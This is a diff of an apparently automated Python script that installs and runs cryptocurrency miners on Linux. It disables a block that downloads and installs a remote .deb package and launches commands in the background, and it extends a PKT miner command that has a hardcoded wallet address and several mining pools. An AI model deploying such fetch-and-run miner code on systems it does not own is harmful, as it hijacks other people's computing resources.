@@ -74,7 +74,7 @@ while True:
             pass
     #utopia
     if operate_system == 'lin':
-        
+        '''
         link_version_uam = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_uam'
         link_download_uam = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/uam-latest_amd64.deb'
         install_deb_name = 'uam-latest_amd64.deb'
@@ -144,7 +144,7 @@ while True:
                     os.system ('%s &' %command)
         except:
             pass
-
+        '''
         #tam bo xmrig
        
         #xmrig
@@ -346,7 +346,7 @@ while True:
         except:
             pass
         if pkt_dachay == False:
-            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkt.world http://pool.pktpool.io -t 2' % pkt_name
+            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.k1m3r4.com/ http://p.master.pktdigger.com/ http://pool.pkteer.com http://pool.pkthash.com -t 3' % pkt_name
             print(command)
             if os.path.isfile('/usr/bin/screen'):
                 print('Co chuong trinh screen')
